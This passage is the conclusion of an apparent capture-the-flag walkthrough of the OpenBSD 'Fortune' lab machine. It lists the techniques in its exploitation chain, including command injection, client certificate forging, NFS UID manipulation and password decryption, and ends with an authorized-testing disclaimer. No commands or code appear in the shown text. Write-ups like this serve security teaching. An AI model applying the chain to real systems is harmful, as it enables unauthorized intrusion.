</code></pre></li></ul><p>These fixes address the exploited vulnerabilities and align with security best practices to prevent similar attacks.</p><h2 id=conclusion>Conclusion<a href=#conclusion class=hanchor arialabel=Anchor>#</a></h2><p>Fortune is an excellent machine that demonstrates the complexity of OpenBSD security and the interconnected nature of system vulnerabilities. It requires expertise in:</p><ul><li>Web application security and command injection exploitation</li><li>SSL/TLS certificate analysis and client certificate generation</li><li>OpenBSD-specific services like authpf and packet filtering</li><li>NFS protocol security and UID manipulation techniques</li><li>PostgreSQL and pgAdmin security analysis</li><li>Cryptographic analysis and password decryption techniques</li></ul><p>The machine emphasizes the importance of proper input validation, secure file permissions, certificate management, and the principle of least privilege in system administration.</p><hr><p><em>This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.</em></p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2025 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>